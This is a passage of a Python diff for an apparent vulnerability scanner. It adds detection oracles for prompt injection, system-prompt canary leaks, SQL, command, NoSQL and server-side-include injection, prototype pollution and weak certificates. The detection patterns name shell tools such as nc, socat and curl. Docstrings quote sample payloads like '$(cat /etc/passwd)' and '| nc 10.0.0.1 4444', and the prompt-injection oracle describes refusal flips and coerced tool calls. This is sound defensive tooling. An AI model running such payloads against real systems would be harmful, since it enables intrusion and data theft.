+        # decisive "reached-but-not-evaluated" clean, distinct from the "product absent" blind branch.
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
+            evidence=f"SSI directive {raw!r} reflected verbatim as an inert comment — reflected, not evaluated",
+            observed={"expected": expected, "raw_present": True})
+
+    if control_body is not None and expected in _coerce_text(control_body):
+        # The "product" is on the page regardless of the directive — not attributable to evaluation.
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence=f"product {expected!r} also present in the benign control — not attributable to SSI evaluation",
+            observed={"expected": expected})
+
+    idx = body.find(expected)
+    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
+    return OracleSignal(
+        kind=OracleKind.EVALUATION,
+        fired=True,
+        confidence=0.95,
+        evidence=f"SSI directive {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
+        observed={"expected": expected, "raw": raw, "snippet": snippet, "ssi": True},
+    )
+
+
+_MIN_CANARY_LEN = 16
+
+
+_MIN_CANARY_ENTROPY_BITS_PER_CHAR = 2.5
+
+
+def _shannon_bits_per_char(s: str) -> float:
+    """Shannon entropy of ``s`` in bits/char (pure). A random base62/hex sentinel clears
+    ~4-6; a repeated char ("aaaa…") is 0; an English phrase is ~1-2."""
+    if not s:
+        return 0.0
+    counts = Counter(s)
+    n = len(s)
+    return -sum((c / n) * math.log2(c / n) for c in counts.values())
+
+
+def system_prompt_disclosure_oracle(canary: str, llm_output: Any) -> OracleSignal:
+    """Fire when a PLANTED high-entropy canary sentinel appears VERBATIM in the app's own
+    LLM output — proof the secret LEAKED (system-prompt disclosure). The defensive dual of
+    ``side_effect_oracle``: the operator plants a random sentinel in the system prompt out
+    of band; if the model's response echoes it, the secret provably crossed the boundary.
+
+    Honest scope (doctrine fix P2): this proves DISCLOSURE, not that an *injection* caused
+    it — a benign "repeat your instructions" or the app's own debug path echoes the same
+    sentinel. ``prompt_injection`` (control-vs-treatment behavior delta) is the separate,
+    stronger oracle that earns the adversarial-cause label. The sentinel must be
+    >= 16 chars AND >= 2.5 bits/char so a substring match cannot be coincidental."""
+    sentinel = (canary or "").strip()
+    haystack = llm_output if isinstance(llm_output, str) else _searchable(llm_output)
+    if len(sentinel) < _MIN_CANARY_LEN:
+        return OracleSignal(
+            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
+            evidence=f"canary too short (< {_MIN_CANARY_LEN} chars) to be collision-resistant",
+            observed={"canary_len": len(sentinel)})
+    if _shannon_bits_per_char(sentinel) < _MIN_CANARY_ENTROPY_BITS_PER_CHAR:
+        return OracleSignal(
+            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
+            evidence="canary entropy too low — not a collision-resistant random sentinel",
+            observed={"canary_len": len(sentinel)})
+    idx = haystack.find(sentinel)
+    if idx < 0:
+        return OracleSignal(
+            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
+            evidence="planted canary not present in LLM output — no disclosure",
+            observed={"canary_len": len(sentinel)})
+    # Bounded, redacted human-readable span: reveal only a short window around the hit and
+    # MASK the sentinel itself in the evidence string. (PR1: the retained oracle_context
+    # still holds the verbatim sentinel + output so the certificate re-fires offline — the
+    # reverify contract requires verbatim substrings; documented, not hashes-only.)
+    start = max(0, idx - 16)
+    end = min(len(haystack), idx + len(sentinel) + 16)
+    redacted_span = haystack[start:idx] + "<canary>" + haystack[idx + len(sentinel):end]
+    return OracleSignal(
+        kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=True, confidence=0.95,
+        evidence=f"planted canary disclosed in the app's LLM output: ...{redacted_span}...",
+        observed={"offset": idx, "canary_len": len(sentinel), "redacted_span": redacted_span})
+
+
+def _pi_behavior(obs: Any) -> dict[str, Any]:
+    """Normalise one structurally-detectable LLM behavior observation to the three fields
+    the control-vs-treatment delta compares. Total + deterministic."""
+    if isinstance(obs, Mapping):
+        tool = obs.get("tool")
+        return {
+            "tool": str(tool).strip().lower() if tool not in (None, "") else None,
+            "refused": bool(obs.get("refused", False)),
+            "boundary_token_echoed": bool(obs.get("boundary_token_echoed", False)),
+        }
+    return {"tool": None, "refused": False, "boundary_token_echoed": False}
+
+
+def prompt_injection_oracle(pi_control: Any, pi_treatment: Any) -> OracleSignal:
+    """Fire ONLY when an injected directive PROVABLY flipped a structurally-detectable
+    behavior in the treatment turn vs a CLEAN control turn — the honest, strong proof of
+    prompt injection (doctrine fix P2). Structurally the ``evaluation_oracle``'s control-
+    vs-treatment discipline: the effect present in treatment, absent in the control that
+    omits the attacker directive (everything else held fixed).
+
+    It fires on a BEHAVIOR DELTA, never on structural-override markers alone (those stay
+    LEADs — users legitimately paste "ignore the above"):
+      1. refusal flipped — the clean control refused, the attacker turn complied;
+      2. coerced tool — treatment selected a sensitive tool the clean control did not;
+      3. boundary breakout — the model echoed the instruction/data boundary token only
+         under the injected directive.
+    Same retained (control, treatment) -> same verdict, re-runnable offline."""
+    control = _pi_behavior(pi_control)
+    treatment = _pi_behavior(pi_treatment)
+
+    deltas: list[str] = []
+    if control["refused"] and not treatment["refused"]:
+        deltas.append("refusal flipped to compliance under the injected directive")
+    if treatment["tool"] and treatment["tool"] != control["tool"]:
+        deltas.append(f"injected directive coerced tool {treatment['tool']!r} the clean control did not select")
+    if treatment["boundary_token_echoed"] and not control["boundary_token_echoed"]:
+        deltas.append("instruction/data boundary token echoed only under the injected directive")
+
+    if not deltas:
+        return OracleSignal(
+            kind=OracleKind.PROMPT_INJECTION, fired=False, confidence=0.0,
+            evidence="no structurally-detectable behavior change vs the clean control — "
+                     "markers alone do not confirm prompt injection",
+            observed={"control": control, "treatment": treatment})
+    return OracleSignal(
+        kind=OracleKind.PROMPT_INJECTION, fired=True, confidence=0.9,
+        evidence="prompt injection confirmed by a control-vs-treatment behavior delta: " + "; ".join(deltas),
+        observed={"control": control, "treatment": treatment, "deltas": deltas})
+
+
+_SANITIZER_PATTERNS: list[tuple[re.Pattern[str], str, float]] = [
+    (re.compile(r"ERROR:\s*AddressSanitizer"), "asan", 0.95),
+    (re.compile(r"AddressSanitizer:\s*(DEADLYSIGNAL|SEGV|heap-|stack-|global-)"), "asan", 0.95),
+    (re.compile(r"(heap|stack|global)-buffer-overflow"), "asan", 0.9),
+    (re.compile(r"heap-use-after-free|use-after-free"), "asan", 0.92),
+    (re.compile(r"WARNING:\s*MemorySanitizer"), "msan", 0.9),
+    (re.compile(r"WARNING:\s*ThreadSanitizer|data race"), "tsan", 0.88),
+    (re.compile(r"runtime error:.*(overflow|out of bounds|null pointer|misaligned)"), "ubsan", 0.85),
+    (re.compile(r"UndefinedBehaviorSanitizer"), "ubsan", 0.85),
+    (re.compile(r"LeakSanitizer|detected memory leaks"), "lsan", 0.75),
+    (re.compile(r"\*\*\* stack smashing detected \*\*\*"), "stack-protector", 0.9),
+    (re.compile(r"double free or corruption|malloc\(\): |free\(\): "), "glibc-abort", 0.85),
+    (re.compile(r"thread '.*' panicked at"), "rust-panic", 0.85),
+    (re.compile(r"^panic:", re.MULTILINE), "go-panic", 0.8),
+    (re.compile(r"Segmentation fault|SIGSEGV|SIGABRT|core dumped"), "signal", 0.8),
+    (re.compile(r"Traceback \(most recent call last\):"), "py-traceback", 0.65),
+]
+
+
+def sanitizer_signal_oracle(process_output: Any) -> OracleSignal:
+    """Scan captured stdout/stderr for sanitizer, panic, abort and traceback
+    markers. A single unambiguous crash marker fires; a bare Python traceback
+    fires only at moderate confidence (it can be an ordinary handled error)."""
+    text = _coerce_text(process_output)
+    matches: list[dict[str, Any]] = []
+    for pattern, label, conf in _SANITIZER_PATTERNS:
+        m = pattern.search(text)
+        if m:
+            line = _line_of(text, m.start())
+            matches.append({"label": label, "confidence": conf,
+                            "match": m.group(0), "line": line})
+
+    if not matches:
+        return OracleSignal(
+            kind=OracleKind.SANITIZER_SIGNAL, fired=False, confidence=0.0,
+            evidence="no sanitizer/crash/panic marker in output", observed={})
+
+    best = max(matches, key=lambda x: x["confidence"])
+    return OracleSignal(
+        kind=OracleKind.SANITIZER_SIGNAL,
+        fired=True,
+        confidence=best["confidence"],
+        evidence=f"{best['label']} marker: {best['line'].strip()[:200]}",
+        observed={"matches": matches, "best": best["label"]},
+    )
+
+
+def _line_of(text: str, offset: int) -> str:
+    start = text.rfind("\n", 0, offset) + 1
+    end = text.find("\n", offset)
+    return text[start: end if end >= 0 else len(text)]
+
+
+_PP_KEY_RE = re.compile(r"^cpp_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-KEY canary (scanner.proto_pollution mints cpp_<token_hex>)
+
+
+_PP_VAL_RE = re.compile(r"^ppv_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-VALUE canary (ppv_<token_hex>)
+
+
+def prototype_pollution_oracle(observed: Any) -> OracleSignal:
+    """Fire when a real headless DOM's ACHIEVED runtime state proves client-side prototype
+    pollution: ``Object.prototype[uniqKey] === uniqVal`` for the unique per-probe key/value a
+    ``__proto__[uniqKey]=uniqVal`` gadget drove in, AND a BENIGN-KEY control (a different key
+    that was NEVER injected) stayed ``undefined``.
+
+    ``observed`` is the binding-reported readback a driver captured after rendering the target
+    page — a mapping ``{polluted_key, polluted_val, expected_val, benign_key,
+    benign_key_undefined}``. The oracle judges the ACHIEVED STATE, never that the payload merely
+    appeared: a page that reflects the key into the DOM but does NOT assign it onto
+    ``Object.prototype`` reports ``polluted_val`` absent/mismatched and does not fire.
+
+    Near-zero-FP by three independent guards:
+      * the key AND value must match VIGIL's own per-probe canary SHAPE (``cpp_<hex>`` /
+        ``ppv_<hex>``, minted by ``scanner.proto_pollution`` via ``secrets.token_hex``). This is a
+        SELF-CONTAINED guard: the oracle's standalone re-fire (its certificate) can therefore
+        NEVER be satisfied by a pre-existing NAMED prototype property (``toString``,
+        ``hasOwnProperty``, ``constructor``) or any arbitrary key — a match can only be the
+        high-entropy marker VIGIL drove in, so soundness does not depend on the upstream caller;
+      * the value must reproduce EXACTLY (``polluted_val == expected_val``) — a truthy-but-
+        different value (a page that sets its own default) does not fire;
+      * the BENIGN-KEY control must be ``undefined`` — if some ambient gadget polluted the
+        prototype independently of this probe, ``benign_key_undefined`` is False and the oracle
+        REFUSES to attribute (an ambient-pollution page does not fire).
+
+    This is the client-side ACHIEVED-STATE FACT (CWE-1321), not a posture check: a fire means
+    VIGIL observed ``Object.prototype`` actually carry the value it drove in."""
+    obs = observed if isinstance(observed, Mapping) else {}
+    key = _coerce_text(obs.get("polluted_key")).strip()
+    expected = _coerce_text(obs.get("expected_val")).strip()
+    got_raw = obs.get("polluted_val")
+    got = _coerce_text(got_raw).strip() if got_raw is not None else ""
+    benign_key = _coerce_text(obs.get("benign_key")).strip()
+    benign_undef = obs.get("benign_key_undefined")
+
+    base = {"polluted_key": key, "benign_key": benign_key}
+
+    # SELF-CONTAINED SOUNDNESS: the key/value must match VIGIL's own per-probe canary SHAPE
+    # (scanner.proto_pollution mints ``cpp_<hex>`` / ``ppv_<hex>``). Requiring the shape here — not
+    # merely a length floor — means the oracle's STANDALONE re-fire (its certificate) cannot be
+    # satisfied by a pre-existing NAMED prototype property (``toString``/``hasOwnProperty``/
+    # ``constructor``) or any arbitrary key: a match can ONLY be the high-entropy marker VIGIL drove
+    # in, so soundness never depends on the upstream caller being the sole key source.
+    if not _PP_KEY_RE.match(key):
+        return OracleSignal(
+            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
+            evidence=("pollution key is not a VIGIL per-probe canary marker (expected cpp_<hex>) — an "
+                      "arbitrary or pre-existing prototype property cannot mint this FACT"),
+            observed=base)
+    if not _PP_VAL_RE.match(expected):
+        return OracleSignal(
+            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
+            evidence="expected pollution value is not a VIGIL per-probe canary marker (expected ppv_<hex>)",
+            observed=base)
+
+    # The BENIGN-KEY control gates attribution: a different key that was NEVER injected MUST be
+    # undefined. If it is not (ambient pollution, or a page that pollutes every key), refuse —
+    # we cannot attribute the polluted state to THIS probe.
+    if benign_undef is not True:
+        return OracleSignal(
+            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
+            evidence=("benign-key control was not undefined — cannot attribute the polluted state to this "
+                      "probe (ambient / indiscriminate pollution); refusing"),
+            observed={**base, "benign_key_undefined": benign_undef})
+
+    # The ACHIEVED-STATE test: Object.prototype[key] must reproduce the exact value driven in.
+    if got_raw is None or got != expected:
+        return OracleSignal(
+            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
+            evidence=("Object.prototype was not polluted to the expected value (the payload may have been "
+                      "reflected without polluting the prototype); did not fire"),
+            observed={**base, "expected_val": expected, "observed_val": got})
+
+    return OracleSignal(
+        kind=OracleKind.PROTOTYPE_POLLUTION,
+        fired=True,
+        confidence=0.96,
+        evidence=(f"Object.prototype.{key} was polluted to {expected!r} in a real DOM "
+                  f"(benign-key control {benign_key!r} stayed undefined)"),
+        observed={"polluted_key": key, "polluted_val": expected, "benign_key": benign_key,
+                  "benign_key_undefined": True},
+    )
+
+
+_ERROR_SIGNATURES: list[tuple[re.Pattern[str], str, float]] = [
+    # --- SQL: MySQL / MariaDB ---
+    (re.compile(r"You have an error in your SQL syntax", re.I), "mysql", 0.95),
+    (re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.I), "mysql", 0.95),
+    (re.compile(r"\bwarning:\s*mysqli?_", re.I), "mysql", 0.85),
+    (re.compile(r"MySQLSyntaxErrorException|com\.mysql\.jdbc", re.I), "mysql", 0.9),
+    (re.compile(r"valid MySQL result|Unknown column '[^']+' in 'field list'", re.I), "mysql", 0.85),
+    # --- SQL: PostgreSQL ---
+    (re.compile(r"PostgreSQL.*ERROR|PG::(Syntax|Undefined)|pg_query\(\)|org\.postgresql", re.I), "postgresql", 0.95),
+    (re.compile(r"unterminated quoted string at or near|syntax error at or near", re.I), "postgresql", 0.9),
+    # --- SQL: MSSQL ---
+    (re.compile(r"Unclosed quotation mark after the character string", re.I), "mssql", 0.95),
+    (re.compile(r"Microsoft SQL (Server|Native Client)|System\.Data\.SqlClient\.SqlException", re.I), "mssql", 0.92),
+    (re.compile(r"Incorrect syntax near|\[SQL Server\]", re.I), "mssql", 0.9),
+    # --- SQL: Oracle ---
+    (re.compile(r"\bORA-\d{5}\b", re.I), "oracle", 0.95),
+    (re.compile(r"Oracle.*(Driver|Database)|quoted string not properly terminated", re.I), "oracle", 0.9),
+    # --- SQL: SQLite ---
+    (re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite|sqlite3\.OperationalError", re.I), "sqlite", 0.92),
+    (re.compile(r"unrecognized token:|SQL logic error|near \"[^\"]*\": syntax error", re.I), "sqlite", 0.88),
+    # --- SQL: generic JDBC/ODBC ---
+    (re.compile(r"java\.sql\.SQLException|SQLSTATE\[|ODBC.*Driver.*error", re.I), "sql-generic", 0.8),
+    # --- NoSQL ---
+    (re.compile(r"MongoError|E11000 duplicate key|BSONError|com\.mongodb", re.I), "mongodb", 0.85),
+    # --- LDAP ---
+    (re.compile(r"javax\.naming\.directory|LDAPException|Invalid DN syntax|com\.sun\.jndi\.ldap", re.I), "ldap", 0.82),
+    # --- XPath ---
+    (re.compile(r"XPathException|MS\.Internal\.Xml|Expression must evaluate to a node-set|xmlXPathEval", re.I), "xpath", 0.82),
+]
+
+
+def error_signature_oracle(observed_body: Any, control_body: Any = None) -> OracleSignal:
+    """Fire when a response contains a distinctive **datastore/parser error** that
+    a malformed injection payload provoked — the signature of error-based injection
+    (SQL/NoSQL/LDAP/XPath).
+
+    Two guards keep it precise: the error string must be a known, engine-specific
+    signature (not a generic "error" word), AND — when a benign ``control_body`` is
+    supplied — the SAME signature must be ABSENT from the control, so a page that
+    always shows a stack trace cannot be mistaken for an injection. This is the
+    error-based analogue of the sanitizer oracle: a real backend error is strong,
+    attributable evidence the input reached and broke the query parser."""
+    body = _coerce_text(observed_body)
+    control = _coerce_text(control_body) if control_body is not None else ""
+
+    for pattern, engine, conf in _ERROR_SIGNATURES:
+        m = pattern.search(body)
+        if not m:
+            continue
+        if control and pattern.search(control):
+            # the same error is present without the payload -> not attributable
+            continue
+        line = _line_of(body, m.start())
+        return OracleSignal(
+            kind=OracleKind.ERROR_SIGNATURE,
+            fired=True,
+            confidence=conf,
+            evidence=f"{engine} error provoked by the payload: {line.strip()[:200]}",
+            observed={"engine": engine, "match": m.group(0)[:200]},
+        )
+
+    return OracleSignal(
+        kind=OracleKind.ERROR_SIGNATURE, fired=False, confidence=0.0,
+        evidence="no datastore/parser error signature in the response",
+        observed={})
+
+
+_WEAK_SIG_HASH_RE = re.compile(r"(?i)(?:md[245]|sha-?1(?![0-9]))")
+
+
+_WEAK_SIG_OIDS = frozenset({
+    "1.2.840.113549.1.1.2",   # md2WithRSAEncryption
+    "1.2.840.113549.1.1.3",   # md4WithRSAEncryption
+    "1.2.840.113549.1.1.4",   # md5WithRSAEncryption
+    "1.2.840.113549.1.1.5",   # sha1WithRSAEncryption
+    "1.2.840.10040.4.3",      # dsa-with-sha1
+    "1.2.840.10045.4.1",      # ecdsa-with-SHA1
+    "1.3.14.3.2.29",          # sha1WithRSASignature (legacy)
+    "1.3.14.3.2.27",          # dsaWithSHA1 (legacy)
+})
+
+
+_MIN_RSA_DSA_BITS = 2048
+
+
+_MIN_EC_BITS = 224
+
+
+def weak_crypto_artifact_oracle(observed: Any) -> OracleSignal:
+    """Fire when a parsed crypto artifact (an X.509 cert) is signed with a BROKEN hash — MD5/MD4/MD2 or
+    SHA-1. These are collision-forgeable (MD5 chosen-prefix, SHA-1 SHAttered) with NO benign use for a
+    certificate signature, so a benign modern cert (SHA-256+) does NOT fire. The proof is the retained
+    signatureAlgorithm OID NAME (or dotted OID) — a pure, deterministic classification that re-verifies
+    offline, exactly like ``tls_weakness_oracle`` re-verifies a negotiated cipher name. Emitted under the
+    TLS_WEAKNESS kind (a weak-crypto FACT). Never raises."""
+    if not isinstance(observed, Mapping):
+        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
+                            evidence="no crypto-artifact evidence")
+    name = _coerce_text(observed.get("signature_algorithm")).strip()
+    oid = _coerce_text(observed.get("oid")).strip()
+    subject = _coerce_text(observed.get("subject")).strip()
+    subj = (" " + subject) if subject else ""
+    # (1) BROKEN SIGNATURE HASH — collision-forgeable, no benign use.
+    if (name and _WEAK_SIG_HASH_RE.search(name)) or (oid in _WEAK_SIG_OIDS):
+        return OracleSignal(
+            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
+            evidence=(f"certificate{subj} is signed with the BROKEN hash {name or oid} — collision-forgeable "
+                      "(MD5 chosen-prefix / SHA-1 SHAttered), no benign use"),
+            observed={"signature_algorithm": name, "oid": oid, "subject": subject, "reason": "broken_sig_hash"})
+    # (2) UNDERSIZED PUBLIC KEY — below the ~112-bit-security floor (NIST SP 800-131A, deprecated 2013).
+    key_type = _coerce_text(observed.get("key_type")).strip().lower()
+    try:
+        key_bits = int(observed.get("key_bits"))
+    except (TypeError, ValueError):
+        key_bits = 0
+    if key_bits > 0 and (
+            (key_type in ("rsa", "dsa") and key_bits < _MIN_RSA_DSA_BITS)
+            or (key_type == "ec" and key_bits < _MIN_EC_BITS)):
+        floor = _MIN_RSA_DSA_BITS if key_type in ("rsa", "dsa") else _MIN_EC_BITS
+        return OracleSignal(
+            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.9,
+            evidence=(f"certificate{subj} uses an UNDERSIZED {key_type.upper()} public key ({key_bits}-bit, "
+                      f"below the {floor}-bit floor) — under ~112-bit security (NIST SP 800-131A, deprecated 2013)"),
+            observed={"key_type": key_type, "key_bits": key_bits, "subject": subject, "reason": "short_key"})
+    return OracleSignal(
+        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
+        evidence=f"signature algorithm {name or oid or '?'} is not a broken hash and the key is not undersized")
+
+
+_SQL_TAUT_RE = re.compile(
+    r"""(?i)^(OR|AND|XOR)\b\s*\(?\s*['"]?([A-Za-z0-9_]+)['"]?\s*(?:=|<=>|\bLIKE\b)\s*['"]?([A-Za-z0-9_]+)['"]?""")
+
+
+_SQL_UNION_RE = re.compile(r"(?i)^UNION\b\s+(?:ALL\s+)?SELECT\b")
+
+
+_SQL_STACK_RE = re.compile(
+    r"(?is)^;\s*(?:"
+    r"SELECT\b.{0,120}?\bFROM\b"
+    r"|INSERT\b.{0,40}?\bINTO\b"
+    r"|UPDATE\b.{0,80}?\bSET\b"
+    r"|DELETE\b.{0,40}?\bFROM\b"
+    r"|DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER)\b"
+    r"|CREATE\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER|PROCEDURE)\b"
+    r"|ALTER\s+(?:TABLE|DATABASE|USER|SCHEMA)\b"
+    r"|TRUNCATE\s+TABLE\b"
+    r"|GRANT\b.{0,80}?\bTO\b"
+    r"|EXEC(?:UTE)?\b\s+\w"
+    r")")
+
+
+def _sql_breakout_tails(text: str, quote: str):
+    """Yield the QUERY-context tail after EACH UNESCAPED `quote` in `text` (the injection point is
+    `... WHERE x=<quote>PAYLOAD<quote>`, and any quote in the payload could be the break-out). Honours
+    `''` doubling and `\\` escapes so a legitimately-escaped quote stays inside the literal."""
+    i, n = 0, len(text)
+    while i < n:
+        c = text[i]
+        if c == "\\" and i + 1 < n:
+            i += 2                                  # backslash-escaped char stays in the literal
+            continue
+        if c == quote:
+            if i + 1 < n and text[i + 1] == quote:
+                i += 2                              # doubled quote ('' or "") = an escaped quote
+                continue
+            yield text[i + 1:]                      # unescaped closing quote -> a candidate tail
+        i += 1
+
+
+def _sql_structure_at_start(tail: str) -> str:
+    """The SQL structure PROVEN present at the START of a break-out tail, or "" — the near-zero-FP
+    proofs, each ANCHORED immediately after the break-out (leading whitespace/parens skipped): a
+    boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, or a stacked statement
+    with a full statement shape (`; DROP TABLE`, `; SELECT .. FROM`). A lone comment (`--`/`/*`) is
+    DELIBERATELY not a proof — `'Inception' -- best film`, pasted code comments, and prose em-dashes
+    after a quoted word produce it, so it was a false positive; an attacker's comment almost always
+    follows a tautology/UNION we already catch. Prose after an apostrophe never matches."""
+    s = tail.lstrip().lstrip("()").lstrip()
+    if not s:
+        return ""
+    m = _SQL_TAUT_RE.match(s)
+    if m and m.group(2).lower() == m.group(3).lower():
+        return f"{m.group(1).upper()} tautology ({m.group(2)}={m.group(3)})"
+    if _SQL_UNION_RE.match(s):
+        return "UNION SELECT"
+    if _SQL_STACK_RE.match(s):
+        return "stacked statement"
+    return ""
+
+
+def sql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
+    """Fire iff `payload`, placed inside a SQL string literal, PROVABLY closes it and introduces query
+    STRUCTURE IMMEDIATELY after the break-out (a self-tautology / UNION SELECT / stacked statement /
+    terminating comment). Proves a structured SQL injection ATTEMPT — never exploitation. The
+    STRUCTURE must be anchored to the break-out quote, so ordinary apostrophe-bearing prose is safe:
+    `O'Brien`, `it's fine`, `Don't drop the ball; I'll update you`, `I've got 5 or 6 options`,
+    `credit union, please select` all have only text after the apostrophe and never fire.
+    Pure/deterministic."""
+    kind = OracleKind.SQL_INJECTION_BREAKOUT
+    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
+    if len(text) < 3 or ("'" not in text and '"' not in text):
+        return OracleSignal(kind=kind, fired=False, confidence=0.0,
+                            evidence="no string-literal break-out (no quote to close the literal)",
+                            observed={"param": param})
+    for quote in ("'", '"'):
+        for tail in _sql_breakout_tails(text, quote):
+            struct = _sql_structure_at_start(tail)
+            if struct:
+                return OracleSignal(
+                    kind=kind, fired=True, confidence=0.92,
+                    evidence=(f"payload closes a {quote} SQL string literal and introduces query "
+                              f"structure ({struct}) at the break-out — a structured SQL injection attempt"),
+                    observed={"param": param, "quote": quote, "structure": struct, "break_out": True})
+    return OracleSignal(
+        kind=kind, fired=False, confidence=0.0,
+        evidence="quote present but no SQL structure anchored to a break-out (inert prose, e.g. an apostrophe in text)",
+        observed={"param": param})
+
+
+_SHELL_CMDS = ("cat", "ls", "id", "whoami", "uname", "nc", "ncat", "netcat", "curl", "wget", "bash",
+               "sh", "zsh", "ksh", "powershell", "pwsh", "nslookup", "dig", "cmd", "python", "python3",
+               "perl", "ruby", "php", "chmod", "chown", "mkfifo", "telnet", "socat", "base64", "xxd",
+               "hostname", "ifconfig", "ping", "certutil", "sleep", "rm", "kill", "env")
+
+
+_CMD_ALT = "|".join(sorted(set(_SHELL_CMDS), key=lambda s: (-len(s), s)))
+
+
+_SHELL_CMD_RE = re.compile(r"(?i)(?<![A-Za-z0-9_])(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
+
+
+_SHELL_CMD_AT_START_RE = re.compile(r"(?i)^(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
+
+
+_SHELL_SUBST_RE = re.compile(r"\$\(([^)]{1,300})\)|`([^`]{1,300})`")
+
+
+_SHELL_SYS_DIRS = ("etc", "bin", "usr", "tmp", "var", "dev", "proc", "root", "sys", "opt", "home",
+                   "sbin", "lib", "lib64", "mnt", "srv", "boot", "run", "media")
+
+
+_SHELL_ARG_RE = re.compile(
+    r"(?i)(?:/(?:" + "|".join(_SHELL_SYS_DIRS) + r")\b|\.\.?/|(?<=\s)-[a-z]{1,3}\b"
+    r"|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)")
+
+
+def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
+    """Fire iff `payload` contains an OS-command-execution construct PROVEN by a dangerous command
+    invoked WITH a shell argument — inside a command substitution (`$(cat /etc/passwd)`, `` `curl
+    http://evil/x` ``), or AFTER a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
+    Conservative for near-zero FP: (a) a bare command name is not a proof, so a shell argument is
+    required; (b) the separator branch SKIPS the first segment (a value that merely BEGINS with a
+    command word — `python-requests/2.25.1`, `id > 1000` — had no preceding separator and is benign);
+    (c) `>`/`|` and `tool/version` slashes are not arguments. So `$(id)` / `` `code` `` / `dog|cat` /
+    `Name | Age | ID` / `id > 1000` / `python-requests/2.25.1` do NOT fire. ReDoS-safe (split on the
+    separator class). Pure/deterministic; proves an ATTEMPT, never exploitation."""
+    kind = OracleKind.COMMAND_INJECTION_BREAKOUT
+    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
+    if len(text) < 4:
+        return OracleSignal(kind=kind, fired=False, confidence=0.0,
+                            evidence="too short to carry a command-execution construct",
+                            observed={"param": param})
+    # (1) command substitution wrapping a dangerous command WITH an argument. `$(...)` / backticks are
+    # already a strong shell signal, so a whitespace-separated argument also suffices — `$(id)` /
+    # `` `code` `` / `$(document)` do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
+    for m in _SHELL_SUBST_RE.finditer(text):
+        body = m.group(1) or m.group(2) or ""
+        cmd = _SHELL_CMD_RE.search(body)
+        if not cmd:
+            continue
+        after = body[cmd.end():]
+        # a command immediately followed by `=` is a key=value / assignment / URL query param
+        # (`id=https://...`), NOT a command invocation — the review's header/cookie false positive.
+        if after[:1] == "=":
+            continue
+        if _SHELL_ARG_RE.search(after) or re.match(r"\s+\S", after):
+            return OracleSignal(
+                kind=kind, fired=True, confidence=0.9,
+                evidence=(f"shell command substitution invokes {cmd.group(1)!r} with an argument — "
+                          f"a structured OS command injection attempt"),
+                observed={"param": param, "construct": "substitution", "command": cmd.group(1).lower()})
+    # (2) a command SEPARATOR then a dangerous command WITH a shell argument. Split on the separator
+    #     class (linear, no backtracking) and inspect each segment AFTER a real separator — segment[0]
+    #     had NO preceding separator, so a value that merely starts with a command word is not a proof.
+    for seg in re.split(r"[;|&\n\r]", text)[1:]:
+        seg = seg.strip()
+        cmd = _SHELL_CMD_AT_START_RE.match(seg)
+        if not cmd:
+            continue
+        after = seg[cmd.end():]
+        # `id=https://cdn/...` (a `&`-split URL query param in a Referer/cookie) is a key=value, NOT a
+        # command invocation — the review's header/cookie command-injection false positive.
+        if after[:1] == "=":
+            continue
+        if _SHELL_ARG_RE.search(after):
+            return OracleSignal(
+                kind=kind, fired=True, confidence=0.9,
+                evidence=(f"a command separator chains to {cmd.group(1)!r} with an argument — "
+                          f"a structured OS command injection attempt"),
+                observed={"param": param, "construct": "separator+command", "command": cmd.group(1).lower()})
+    return OracleSignal(
+        kind=kind, fired=False, confidence=0.0,
+        evidence="no command-execution construct (a bare command name or lone metacharacter is not a proof)",
+        observed={"param": param})
+
+
+_NOSQL_OPERATORS: frozenset[str] = frozenset({
+    "ne", "eq", "gt", "gte", "lt", "lte", "in", "nin",     # comparison
+    "or", "and", "nor", "not",                              # logical
+    "exists",                                              # element
+    "where", "expr", "mod", "text", "jsonschema",          # evaluation
+    "all", "elemmatch", "size",                            # array
+})
+
+
+_NOSQL_OP_ALT = "|".join(sorted(_NOSQL_OPERATORS, key=lambda s: (-len(s), s)))
+
+
+_NOSQL_PARAM_OP_RE = re.compile(r"(?i)(?:^|\[)\$(" + _NOSQL_OP_ALT + r")(?=$|\])")
+
+
+_NOSQL_JSON_CAP = 65536      # bound the JSON parse input on the value path (DoS-safe on adversarial input)
+
+
+_NOSQL_SCAN_DEPTH = 32       # bound the recursion over a parsed JSON value (stack-safe)
+
+
+def _nosql_operator_key(obj: Any, depth: int = 0) -> str:
+    """The first KNOWN MongoDB operator appearing as an object KEY anywhere in a parsed JSON `obj` (to a
